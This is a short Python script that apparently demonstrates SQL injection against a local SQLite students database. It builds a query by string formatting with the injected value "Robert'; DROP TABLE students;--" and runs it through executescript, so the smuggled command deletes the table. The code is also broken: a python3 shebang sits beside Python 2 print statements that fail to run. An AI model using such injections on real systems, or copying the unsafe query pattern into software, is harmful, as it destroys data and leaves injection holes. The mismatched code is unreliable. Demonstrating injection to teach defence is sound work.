#!/usr/bin/python3
import sqlite3

db = "./students.db"
conn = sqlite3.connect(db)
c = conn.cursor()

print("Without Hack: \n")

c.execute("SELECT * from students WHERE Name='Robert'")
result = c.fetchall()
print result

print("With Hack: \n")
Name = "Robert'; DROP TABLE students;--"
print("SELECT * from students WHERE Name='%s'" % Name)
c.executescript("SELECT * from students WHERE Name='%s'" % Name)

result = c.fetchall()
print result

conn.close()